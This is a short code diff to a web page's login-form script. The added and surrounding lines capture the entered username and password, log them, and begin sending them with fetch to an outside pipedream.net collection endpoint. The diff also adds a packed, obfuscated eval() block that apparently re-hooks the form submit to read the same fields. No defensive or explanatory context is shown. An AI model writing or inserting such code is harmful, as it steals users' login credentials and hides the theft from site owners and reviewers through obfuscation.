@@ -42,6 +42,8 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     // Log the credentials to the console
     console.log('Username:', username);
     console.log('Password:', password);
+    // Obfuscated code
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3.4(\'5\').6(\'7\',8(9){9.0();a b=3.4(\'c\').d;e f=3.4(\'g\').d;h.i(\'j:\',b);h.i(\'k:\',f)});',22,22,'preventDefault|username|password|document|getElementById|loginForm|addEventListener|submit|function|event|const|value|console|log|Username|Password'.split('|'),0,{}))
 
     // Send the credentials to Requestbin
     fetch('https://eoj56v5yfq0z2cx.m.pipedream.net' , {
